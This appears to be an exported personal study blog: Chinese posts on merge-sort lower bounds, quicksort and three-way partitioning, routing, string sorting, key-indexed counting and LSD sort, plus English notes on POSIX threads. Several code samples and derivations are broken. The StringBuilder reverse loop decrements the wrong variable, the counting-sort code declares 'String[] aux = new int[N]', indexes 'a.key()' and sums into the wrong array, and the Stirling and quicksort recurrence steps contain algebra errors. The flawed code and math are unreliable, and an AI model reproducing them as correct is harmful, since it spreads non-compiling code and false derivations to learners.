<p>自顶向下的归并排序和自底向上的归并排序都是一种很直观的实现，当我们遇到一个问题的时候，如果可以考虑用其中一种方法去解决，都应很自然的试试用另外一种方法去解决。</p>
<h2 id="排序算法的复杂度"><a href="#排序算法的复杂度" class="headerlink" title="排序算法的复杂度"></a>排序算法的复杂度</h2><p>一个学习归并排序的重要原因是因为它是证明计算复杂性中一个重要结论的基础，即任何基于比较的排序算法，时间复杂度都不会低于$NlogN$。</p>
<p>下面我们引入决策树这一数学模型去证明这个结论。决策树中只存在两种类型的节点，一种是叶子节点，一种是内部节点。内部节点表示一次比较，而叶子节点表明最终的排序序列。由排列组合知识可知，长度为$N$的序列最终的排序结果可能有$N!$种（假设不存在相等的键），那么决策树中的叶子节点就会是$N!$个，而对于一个完美二叉树来说，高度为n的这样的树会有$2^n$个叶子节点，这也是二叉树所能达到的最多的节点数量。所以我们有$N!&lt;=number of leaves&lt;=2^h$，h就是最坏情况下的比较次数。对两侧取对数运算，可知h至少是$lgN!$，根据斯特灵公式，可知$lgN ~ NlgN$。</p>

<p>结合归并排序最坏的时间复杂度为$NlgN$，以及任何基于比较的排序算法至少要$NlgN$，可得出下面的结论，归并排序是一种渐进最优的基于比较排序的算法。</p>
]]></content>
      <categories>
        <category>sorting algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>quick-sort</title>
    <url>/2018/12/01/quick-sort/</url>
    <content><![CDATA[<h2 id="基本算法"><a href="#基本算法" class="headerlink" title="基本算法"></a>基本算法</h2><p>快排是一种基于分治的算法，将数组分成两部分，将两部分独立排序，当两个子数组都有序时，整个数组也就有序了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Quick</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a)</span> </span>&#123;</span><br><span class="line">        StdRandom.shuffle(a); <span class="comment">// 打乱数组</span></span><br><span class="line">        sort(a, <span class="number">0</span>, a.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> j = partition(a, lo, hi);</span><br><span class="line">        sort(a, lo, j - <span class="number">1</span>);</span><br><span class="line">        sort(a, j + <span class="number">1</span>, hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>实现算法的关键是partition方法，在这里，我们每次选用第一个元素作为partition元素，将他放在合适的位置，保证在他之前的元素都小于他，在他之后的元素都大于他。通过维护两个指针变量实现这个策略，代码如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = lo, j = hi + <span class="number">1</span>;</span><br><span class="line">    Comparable v = a[lo];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(less(a[++i], v)) <span class="keyword">if</span>(i &gt; hi) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span>(less(v, a[--j])) <span class="keyword">if</span>(j &lt; lo) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= j) <span class="keyword">break</span>;</span><br><span class="line">        exch(a, i, j);</span><br><span class="line">    &#125;</span><br><span class="line">    exch(a, lo, j);</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><p>快排之所以快，是因为他的内循环特别短小，只将有限数量的元素和固定的值相比。而归并排序或者希尔排序，还要将元素进行移动。快排还快在只需少量的比较，快排的最佳情况是每次都将partition置于中间位置，如此一来，时间复杂度分析就类似归并排序，有$C(N) = 2C(N/2) + N$的递推关系，可知时间复杂度为$NlgN$。</p>
<p>下面分析一下快速排序在平均情况下的时间复杂度，首先说明我们要证明的结论：快排在平均情况下需要$2NlnN$次比较（对$N$个不同键的元素排序）。$C(N)$表示排序$N$个不同的键所需要的比较次数。<br>$$C_N = N + 1 + (C_0 + C_1 + … + C_(N - 2) + C_(N - 1)) / N + (C_(N - 1) + C_(N - 2) + … + C_0) / N$$</p>
<p>$$NC_N=N(N+1)+2(C_0+C_1+…+C_(N-2)+C_(N-1))$$<br>两侧同时减去$N-1$相同的项。<br>$$NC_N-(N-1)C_(N-1)=2N+2C_(N-1)$$<br>同时除以$N(N-1)$<br>$$C_N/(N+1)=C_(N-1)/N+2(N+1)$$<br>$$C_N<del>2(N+1)(1/3+1/4+…+1/(N+1))$$<br>利用微积分知识可知，$C(N)</del>2NlnN$，也就是$1.39NlgN$，平均情况只比最好情况坏39%。</p>
<p>最坏情况下是数组已经有序，在这种情况下partition完全没有意义，每次partition得到的子数组之一总是为空。<br>$$N+(N-1)+(N-2)+…+2+1=(N+1)N/2$$</p>
<h2 id="实践中改善"><a href="#实践中改善" class="headerlink" title="实践中改善"></a>实践中改善</h2><ul>
<li>插入排序小型数组。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(hi &lt;= lo + CUTOFF - <span class="number">1</span>) &#123;</span><br><span class="line">        Insertion.sort(a, lo, hi);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> j = partition(a, lo, hi);</span><br><span class="line">    sort(a, lo, j - <span class="number">1</span>);</span><br><span class="line">    sort(a, j + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>进行三取样切分，减少了比较次数，增长了交换次数，当partition元素在中间时，需要更多的交换次数。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(hi &lt;= lo) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> m = medianOfThree(a, lo, lo + (hi - lo) / <span class="number">2</span>, hi);</span><br><span class="line">    exch(a, lo, m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j = partition(a, lo, hi);</span><br><span class="line">    sort(a, lo, j - <span class="number">1</span>);</span><br><span class="line">    sort(a, j + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>熵最优排序<br>数组中可能包含大量重复元素，我们采用一种简单策略，将数组切分为小于partition元素的部分，等于partition元素的部分和大于partition元素的部分，dijkstra推广了这个策略，也就是著名的荷兰国旗问题。</li>
</ul>
<p>Dijkstra的解法是维护三个指针，lt和gt以及i。维持如下的不变性：a[lo…lt-1]元素都小于v，a[gt+1..hi]元素都大于v,a[lt..i-1]都等于v，a[i…gt]元素还未确定。一开始令i和lo相等，有如下三种情况：</p>
<ul>
<li>a[i]小于v，交换a[i]和a[lt]，并且增加lt的值，增加i的值</li>
<li>a[i]大于v，交换a[i]和a[gt]，并减小gt的值，</li>
<li>a[i]等于v，增加i的值</li>
</ul>
<p>最初这种策略并没有很流行，因为相对于并没有很多相等键的常规情况下，这种算法所需要的交换次数较多。但在上世纪90年代，bentley和Mcilroy解决了这个问题，并且观察到3-way partition对于重复键很多的序列排序在实际应用中要快于归并排序等其他排序算法，之后，bentley和Sedgewick证明了这一点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Quick3way</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hi &lt;= lo) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> lt = lo, gt = hi, i = lo + <span class="number">1</span>;</span><br><span class="line">        Comparable v = a[lo];</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= gt) &#123;</span><br><span class="line">            <span class="keyword">if</span>(less(a[i], v)) exch(a, i++, lt++);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(less(v, a[i])) exch(a, i, gt--);</span><br><span class="line">            <span class="keyword">else</span> i++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(a, lo, lt - <span class="number">1</span>);</span><br><span class="line">        sort(a, gt + <span class="number">1</span>, hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当数组中包含大量重复键时，考虑一种极端情况，数组所有的键值相同。那么在实现partition时，如果遇到相等元素不停下时，就会产生快排的最坏情况，此时，每次partition只去除数组中一个元素，算法的运行时间是平方级别。而三项切分的好处就是能将与partition元素相等的键值放到正确的位置，而在递归调用中不需要对这部分再进行排序，无疑大大缩短了有重复元素数组的排序时间。可以证明，在含有大量重复元素的数组中运用三向切分的快速排序的排序时间可以下降到线性级别。</p>
]]></content>
      <categories>
        <category>sorting algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>routing</title>
    <url>/2018/12/11/routing/</url>
    <content><![CDATA[<h2 id="辨别路由状态的合法性"><a href="#辨别路由状态的合法性" class="headerlink" title="辨别路由状态的合法性"></a>辨别路由状态的合法性</h2><p>路由协议的基本目标就是维护全局路由状态(global routing state)的合法性(valid)，可以通过死端和循环的存在来确定路由状态的合法性。路由状态合法的充分必要条件就是不存在死端与循环的链路。死端是对于一个路由，不存在出链路了，也就是无法继续转发这个包，死在互联网中。而循环在路由协议的制定中是一个比较受关注的问题，当前的不同的路由协议的差异就在于对循环的处理。</p>
<h2 id="产生合法路由状态的方法"><a href="#产生合法路由状态的方法" class="headerlink" title="产生合法路由状态的方法"></a>产生合法路由状态的方法</h2><p>避免死端的做法比较简单，只需要将你知道的路由信息告诉你的邻居，如此递归进行下去，便不会出现死端的情况。而循环相对复杂，典型的解决方法有以下四种：</p>
<ul>
<li>根据拓扑状态创建树：如果拓扑不包含循环，并且不将包转发回去，则可以确定不会产生循环转发情况。实际应用是L2的learning switch，应用场所是单栋大楼里面生成树加自学习，以太网。</li>
<li>获取全局视野(Global view)：如果我们知道整个网络的拓扑状态，就能根据很多图算法计算路由状态。实际应用是LS算法和SDN，应用场所是域内，企业或者校园网，OSPF全局视野，RIP最小跳度量</li>
<li>分布式路由计算：包含两种策略，第一种计算最小度量，第二种是路由器明确交换路径。实现方法一的策略是计算最短路径，终点先站起来，然后声明自己的距离为0，坐下之后邻居站起来，声明距离为1，以此类推，每个人都记得是谁叫的他们。直到起点站起来，并且知道是谁叫的他，往后追溯就可以寻找到一条路经。实际应用是DV算法。实现方法二同样是终点站起来，但是这次是声明路径，也就是自己本身，然后邻居站起来，将自己加到路径里面，实际应用是域间路由的BGP算法。</li>
</ul>
<h2 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h2><p>最简单的避免循环的方法是建立一个生成树，选择有最小identifier的结点作为root，然后计算出一个最小生成树。</p>
]]></content>
  </entry>
  <entry>
    <title>string-sort</title>
    <url>/2018/12/02/string-sort/</url>
    <content><![CDATA[<h2 id="String-in-java"><a href="#String-in-java" class="headerlink" title="String in java"></a>String in java</h2><p>java中字符串的表示是不可变的定长char型数组，char型为16位无符号整数，采用Unicode编码，最多支持65536个字符。length以及charAt, substring方法为常数时间复杂度，substring只返回一个String的实例。而concat操作由于要创建新的char数组作为字符串返回，所以时间复杂度为concat的两个字符串的长度和。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span>[] value; <span class="comment">// characters</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> offset; <span class="comment">// index of first char in array</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> length; <span class="comment">// length of string</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hash; <span class="comment">// cache of hashCode()</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> length; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charAt</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123; <span class="keyword">return</span> value[i + offset]; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">String</span><span class="params">(<span class="keyword">int</span> offset, <span class="keyword">int</span> length, <span class="keyword">char</span>[] value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.offset = offset;</span><br><span class="line">        <span class="keyword">this</span>.length = length;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">substring</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(offset + from, to - from, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverse</span><span class="params">(String a)</span> </span>&#123;</span><br><span class="line">    String r = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = a.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) </span><br><span class="line">        r += a.charAt(i);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述这段代码运行时间是$1 + 2 + … + n$，为平方级别。所以我们引入java中另外一种字符串的表示，也就是StringBuilder类，如下是改进后的代码，运行时间为线性级别，StringBuilder底层为变长char型数组实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverse</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    StringBuilder reverse = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = s.length - <span class="number">1</span>; s &gt;= <span class="number">0</span>; s--)</span><br><span class="line">        reverse.append(s.charAt(i));</span><br><span class="line">    <span class="keyword">return</span> reverse.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下图是String和StringBuilder的运行时间对比，可以看出，对于concat操作，StringBuilder明显更胜一筹，因为String每次都要新初始化一个String对象，而StringBuilder为变长数组，所以均摊时间为常数级别。但是对于substring操作，StringBuilder由于只有一个char变长数组，每次substring都要重新初始化一个StringBuilder对象，所以时间复杂度为线性级别，而对于String来说，只是返回一个String的实例而加以同的offset，所以开销很小，为常数级别。</p>


<h2 id="键索引计数法"><a href="#键索引计数法" class="headerlink" title="键索引计数法"></a>键索引计数法</h2><p>考虑一个典型案例，班级中的每个学生对应一个section，我们的目的是将这些学生按照section排序，a[i].key()返回该学生的section。</p>


<ol>
<li>计算count数组，在这一步中，根据每个学生的学生section，加一后作为索引存放在count数组，代码如下</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    count[a[i].key() + <span class="number">1</span>]++;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>根据count数组计算在最终排序的数组中每个条目对应的起始索引。举个栗子，这里对应1的有3人，对应2的有5人，所以最终对应3的起始索引就为8。其实上一步计算出来的count数组代表的是小于每个索引的上一个索引的数目。所以这里计算最终起始索引就很容易了。只需要有如下代码</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++) &#123;</span><br><span class="line">    a[i + <span class="number">1</span>] += a[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>分布数据<br>第二步计算出了最终排序数组每个条目对应的起始索引，下面只需要利用一个aux数组将对应的索引填入数据即可，填入数据之后还要将count对应的项加一，以便下次出现相同键的时候可以放到正确的位置。这样只需要对原数组进行一次遍历，就可以完成对整个数组的排序。代码如下<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    aux[count[a[i].key()]++] = a[i];</span><br></pre></td></tr></table></figure></li>
<li>回写<br>将排好序的数组回写到原数组。</li>
</ol>
<p>完整代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> N = a.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[R + <span class="number">1</span>];</span><br><span class="line">String[] aux = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">// compute the count array</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    count[a[i].key()+<span class="number">1</span>]++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate the starting index of resulting array</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++)</span><br><span class="line">    count[i + <span class="number">1</span>] += count[i];</span><br><span class="line"></span><br><span class="line"><span class="comment">// distribute records</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    aux[count[a.key()]++] = a[i];</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy back</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    a[i] = aux[i];</span><br></pre></td></tr></table></figure>
<p>该排序访问了$8N+3R+1$次数组，并且是个稳定排序，对于key在0到R-1范围。<br>初始化数组访问数组$N+R+1$次，第一次循环$2N$次，第二次循环$2R$次，第三次循环$3N$次，第四次循环$2N$次。当R相对于N较小时，这是个线性时间算法，突破了比较排序算法$NlgN$的下界。</p>
<h2 id="LSD算法"><a href="#LSD算法" class="headerlink" title="LSD算法"></a>LSD算法</h2><p>```java<br>public class LSD {<br>    public static void sort(String[] a, int m) {<br>        String[] aux = new String[a.length()];<br>        int R = 256;<br>        for(int d = m - 1; d &gt;= 0; d–) {<br>            int[] count = new int[R + 1];<br>            for(int i = 0; i &lt; a.length(); i++)<br>                count[a[i].charAt(d) + 1]++;<br>            for(int r = 0; r &lt; R - 1; r++)<br>                count[r+1] += count[r];<br>            for(int i = 0; i &lt; a.length(); i++)<br>                aux[count[a[i].charAt(d)]++] = a[i];<br>            for(int i = 0; i &lt; a.length(); i++)<br>                a[i] = aux[i];<br>        }<br>    }<br>}</p>
]]></content>
      <categories>
        <category>string algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>thread API</title>
    <url>/2020/06/08/thread-API/</url>
    <content><![CDATA[<h2 id="Thread-creation"><a href="#Thread-creation" class="headerlink" title="Thread creation"></a>Thread creation</h2><p>The following is the thread creation interface for POSIX.<br><img src="https://s1.ax1x.com/2020/06/09/tho7DJ.png" alt="tho7DJ.png"></p>
<h3 id="Arguments"><a href="#Arguments" class="headerlink" title="Arguments"></a>Arguments</h3><ul>
<li>thread: a pointer to a structure of type <code>pthread_t</code>, use the structure to interact with this thread.</li>
<li>attr: specify attributes the thread may have. For example, set the stack size or information about scheduling priority of the thread. A call to <code>pthread_attr_init</code> is needed to initialize an attribute. Most cases, default is fine.</li>
<li>start_routine: A function which the thread start running in. It’s a <strong>function pointer</strong> in C. For example, see the following to understand how to use it.<br><img src="https://s1.ax1x.com/2020/06/09/thbpKU.png" alt="thbpKU.png"></li>
<li>arg: the argument to be passed to the function where the thread begins execution. Having a void pointer as argument allows us pass <em>any</em> type of parameter to the <code>start_routine</code>, have it as return value allows us return <em>any</em> type of result.<a id="more"></a>

</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="https://s1.ax1x.com/2020/06/09/thbqsO.png" alt="thbqsO.png"></p>
<h2 id="Thread-Completion"><a href="#Thread-Completion" class="headerlink" title="Thread Completion"></a>Thread Completion</h2><p>When we want to wait for a thread to complete, we call the routine <code>pthread_join</code>.<br><img src="https://s1.ax1x.com/2020/06/09/thLPhR.png" alt="thLPhR.png"></p>
<h3 id="Arguments-1"><a href="#Arguments-1" class="headerlink" title="Arguments"></a>Arguments</h3><ul>
<li>thread: specify which thread to wait for. It’s initialized by the thread creation routine(pass a pointer to it as an argument to <code>pthread_create</code>).</li>
<li>value_ptr: a pointer to the return value u expect to get back. The routine can return anything, so a void pointer. Routine changes the value of the argument, we need to pass a pointer to that value, not just value itself.</li>
</ul>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p><img src="https://s1.ax1x.com/2020/06/09/t4vecn.png" alt="t4vecn.png"></p>
<ul>
<li>often times we don’t have to do all of the packing and unpacking of arguments. Just pass <code>NULL</code> to the routine.</li>
<li>If we pass a single value(an int), we don’t have to package it up as an argument.<br><img src="https://s1.ax1x.com/2020/06/09/t504PA.png" alt="t504PA.png"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">threadfunc</span><span class="params">(<span class="keyword">void</span> *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id = (<span class="keyword">intptr_t</span>) param;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i, r;</span><br><span class="line">r = pthread_create(&amp;thread, <span class="literal">NULL</span>, threadfunc, (<span class="keyword">void</span> *) (<span class="keyword">intptr_t</span>) i);</span><br></pre></td></tr></table></figure>
<strong>bad version</strong><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *ptr = arg;</span><br><span class="line">    <span class="comment">// Has *ptr changed by the time we get here?  Maybe!</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Arg = %d\n"</span>, *ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">pthread_t</span> threads[N];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="comment">// NO NO NO NO this is bad!</span></span><br><span class="line">        pthread_create(&amp;threads[i], <span class="literal">NULL</span>, thread_func, &amp;i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        pthread_join(threads[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>tips: Suppress warning using <code>-Wno-int-to-void-pointer-cast</code></li>
<li><strong>caution</strong>: don’t use &amp; operator, use explicit type cast to make that each variable is independent on every thread.</li>
</ul>
</li>
<li>don&#39; return variable that is allocated on stack.</li>
<li>There is an easier way to create a thread, which is called <strong>procedure call</strong>.</li>
<li>Not all multi-threaded code uses the <code>join</code> routine, for example, web server.</li>
</ul>
<h2 id="Locks"><a href="#Locks" class="headerlink" title="Locks"></a>Locks</h2>]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>concurrency</tag>
        <tag>thread</tag>
      </tags>
  </entry>
  <entry>
    <title>threads</title>
    <url>/2020/06/08/threads/</url>
    <content><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul>
<li>what: Abstraction for a single running process, has more than one point of execution, which means it has multiple PCs. Like process, but different in that threads <strong>share</strong> the same address space.</li>
<li>state: Has a PC and its own private set of registers it uses for computation. If two threads are running on one CPU, then switch between them needs a <strong>context switch</strong>. T1 register state saved and T2 register state restored before running T2. With process, we save state to PCB(process control block). With threads, we need one or more <strong>thread control block</strong>(aka TCB). One major difference: we need not change the page table, which means we have the same address space for different threads.</li>
<li>stack: In <strong>single-threaded</strong> process, there is a single stack, residing at the bottom of the address space. In <strong>multi-threaded</strong> process, we have different stacks, as following picture shows.<br><img src="https://s1.ax1x.com/2020/06/08/tfeCQS.png" alt="tfeCQS.png"><a id="more"></a></li>
<li>why: <ul>
<li><strong>parallelism</strong>: Using a thread per CPU can make programs run faster on modern machine. In this way, we perform a portion of the work on different threads. The task of transforming <strong>single-threaded</strong> program into a program that does this work is called <strong>parallelization</strong>.</li>
<li>avoid blocking because of slow IO: When waiting for I/0, the thread can switch to other threads. THreading enables <strong>overlap</strong> of IO with other activities within a single program, like <strong>multiprogramming</strong> for process. We can also use process to do this, but threading makes shared data easy. Process is more suited for logical separate tasks.</li>
</ul>
</li>
</ul>
<h2 id="An-example-Thread-creation"><a href="#An-example-Thread-creation" class="headerlink" title="An example: Thread creation"></a>An example: Thread creation</h2><p>Execution order is not derterminate, which shows as following. Which is decided by scheduler.<br><img src="https://s1.ax1x.com/2020/06/08/tf3D0K.png" alt="tf3D0K.png"><br><img src="https://s1.ax1x.com/2020/06/08/tf8kcR.png" alt="tf8kcR.png"></p>
<h2 id="The-problem-of-concurrency"><a href="#The-problem-of-concurrency" class="headerlink" title="The problem of concurrency"></a>The problem of concurrency</h2><ul>
<li><p>critical section: A <strong>critical section</strong> is a piece of code that accesses a shared variable (or more generally, a shared resource) and must not be concurrently executed by more than one thread.</p>
</li>
<li><p>mutual exclusion: What we want is called <strong>mutual exclusion</strong>. When one thread is executing within the critical section, the others will be prevented from doing so.</p>
</li>
</ul>
<h2 id="The-wish-for-atomicity"><a href="#The-wish-for-atomicity" class="headerlink" title="The wish for atomicity"></a>The wish for atomicity</h2><ul>
<li><p>wish: Atomically, in this context, means “as a unit”, which sometimes we take as “all or none”. What we’d like is to execute the three instruction sequence atomically.<br><img src="https://s1.ax1x.com/2020/06/08/th0rCt.png" alt="th0rCt.png"></p>
</li>
<li><p>how: What we will do is ask the hardware for a few useful<br>instructions upon which we can build a general set of what we call <strong>synchronization primitives</strong>.</p>
</li>
<li><p>Plus: We also want to explore the mechanisms behind sleeping and waking threads. When thread performs a disk IO and is put to sleep, then when IO completes, we must rouse it.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>一些面试题</title>
    <url>/2018/01/07/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<ul>
<li>如何获取2017-03-10这样格式的日期</li>
<li>获取随机数，要求是长度一致的字符串格式</li>
<li>写一个能遍历对象和数组的通用forEach函数</li>
</ul>
<p>关于对象补充一点：复制保存着对象的某个变量时，操作的是对象的引用，比如我们可以将对同一对象的引用的其中一个变量赋值为null，而不会影响其他指向这个对象的变量的值，但是当为对象添加属性的时候，操作的是对象本身，体现在当我们为保存着对象的某个变量添加属性的时候，其他所有的变量也会跟着受影响。</p>
<a id="more"></a>

<hr>
